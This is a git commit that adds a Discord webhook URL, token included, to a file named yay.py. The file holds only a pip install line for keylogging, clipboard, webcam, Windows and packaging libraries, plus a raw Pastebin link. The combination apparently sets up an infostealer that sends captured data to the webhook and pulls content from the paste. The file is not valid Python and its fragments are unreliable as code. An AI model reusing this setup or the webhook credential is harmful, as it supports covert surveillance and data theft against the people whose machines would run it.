2d26db1f4b4f74450eae8fea9d34be868ed1812e
IDKwhyimhereDoyou <nippiyistheman@gmail.com>
2025-12-24 18:59:03 +0000

    Update yay.py

--- yay.py
+++ yay.py
@@ -1,5 +1,6 @@
 pip install requests pillow pynput opencv-python cryptography pywin32 pyinstaller pyperclip pynput
 
+https://discord.com/api/webhooks/1453461921733939202/NpZz8x6PQZsh9GmJUIpPT4hK12PJEOm8V0y23nRTtBBbvdk_5c4iin076WJK3srQN2Px
 
 https://pastebin.com/raw/m5U6eger
 
